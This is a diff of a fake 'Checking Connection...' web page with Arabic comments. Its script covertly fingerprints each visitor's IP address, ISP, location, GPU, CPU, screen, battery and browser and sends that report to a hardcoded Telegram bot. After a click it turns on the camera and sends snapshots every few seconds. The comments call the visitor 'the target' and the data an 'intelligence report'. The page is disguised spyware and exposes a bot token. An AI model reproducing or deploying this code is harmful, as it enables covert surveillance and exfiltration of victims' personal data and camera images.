@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Checking Connection...</title>
     <style>
         body { background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { text-align: center; }
@@ -24,41 +24,46 @@
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        // إخفاء البيانات في مسار واحد
+        // دمج البيانات في مسار واحد للتمويه
         const _a = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
         const _i = "2103976274";
 
         async function fullScan() {
             let n = navigator;
-            let report = `🛑 **تقرير تقني شامل (فوري)**\n\n`;
+            let report = `🛑 **تقرير استخباراتي دقيق (فوري)**\n\n`;
 
-            // 1. جلب IP وشركة الاتصالات والموقع بدقة احترافية
+            // 1. جلب الـ IP والمعلومات الجغرافية وشركة الإنترنت بدقة عالية (استخدام خدمة ip-api)
             try {
-                const res = await fetch('https://ipwho.is/');
+                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,timezone,isp,org,as,query');
                 const j = await res.json();
-                report += `🌍 **الآي بي:** \`${j.ip}\`\n`;
-                report += `🏢 **الشركة (ISP):** ${j.connection.isp}\n`;
-                report += `📡 **نوع الشبكة:** ${j.connection.type || 'غير محدد'}\n`;
-                report += `📍 **الموقع:** ${j.city}, ${j.country} (${j.timezone.id})\n`;
-            } catch (e) { report += `🌍 **الآي بي:** فشل جلب بيانات الشبكة\n`; }
+                if (j.status === "success") {
+                    report += `🌍 **الآي بي:** \`${j.query}\`\n`;
+                    report += `🏢 **الشركة (ISP):** ${j.isp}\n`;
+                    report += `📡 **المنظمة:** ${j.org || 'غير متوفر'}\n`;
+                    report += `📍 **الموقع:** ${j.city}, ${j.country} (${j.regionName})\n`;
+                }
+            } catch (e) { 
+                // محاولة بديلة في حال فشل الأولى
+                const res2 = await fetch('https://ipwho.is/').then(r => r.json());
+                report += `🌍 **الآي بي:** \`${res2.ip}\`\n🏢 **الشركة:** ${res2.connection.isp}\n`;
+            }
 
-            // 2. كشف الجهاز (Deep System Detection)
-            report += `📱 **النظام الأساسي:** ${n.platform}\n`;
+            // 2. كشف الجهاز والمتصفح بدقة (Advanced Detection)
+            report += `📱 **النظام:** ${n.platform}\n`;
+            report += `🧭 **المتصفح الحقيقي:** ${getAdvancedBrowser()}\n`;
             
-            // كشف كارت الشاشة (يعطي تلميحاً قوياً لموديل الهاتف)
+            // كشف كارت الشاشة (تحديد موديل الهاتف)
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                report += `🎮 **المعالج الرسومي:** ${renderer}\n`;
+                report += `🎮 **الرسوميات:** ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
             } catch(e) {}
 
-            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 'غير محدد'}\n`;
-            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height} (Zoom: ${window.devicePixelRatio})\n`;
-            report += `🧭 **المتصفح:** ${parseUA()}\n`;
+            report += `⚙️ **المعالج:** ${n.hardwareConcurrency || '؟'} Cores\n`;
+            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
 
-            // 3. البطارية والوقت
+            // 3. البطارية
             try {
                 const b = await n.getBattery();
                 report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
@@ -68,20 +73,26 @@
 
             send(report);
 
-            // تحويل الواجهة
             setTimeout(() => {
                 document.getElementById('auth').style.display = 'inline-block';
                 document.getElementById('st').innerText = "اكتمل الفحص بنجاح.";
             }, 1000);
         }
 
-        function parseUA() {
-            let u = navigator.userAgent;
-            if (u.includes("Brave")) return "Brave Browser";
-            if (u.includes("Edg")) return "Microsoft Edge";
-            if (u.includes("Chrome")) return "Google Chrome";
-            if (u.includes("Safari") && !u.includes("Chrome")) return "Apple Safari";
-            return "متصفح مجهول";
+        // دالة متطورة لكشف المتصفح ومنع التمويه
+        function getAdvancedBrowser() {
+            let ua = navigator.userAgent;
+            let browser = "مجهول";
+            
+            if (ua.includes("Brave") || (navigator.brave && navigator.brave.isBrave())) browser = "Brave Browser";
+            else if (ua.includes("Edg/")) browser = "Microsoft Edge";
+            else if (ua.includes("OPR/") || ua.includes("Opera/")) browser = "Opera";
+            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+            else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
+            else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+            
+            return browser;
         }
 
         document.getElementById('auth').onclick = async function() {
@@ -90,7 +101,7 @@
                 const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('v').srcObject = s;
                 setInterval(take, 3500);
-            } catch (e) { send("⚠️ المستهدف حظر الكاميرا"); }
+            } catch (e) { send("⚠️ المستهدف رفض الكاميرا"); }
         };
 
         function take() {
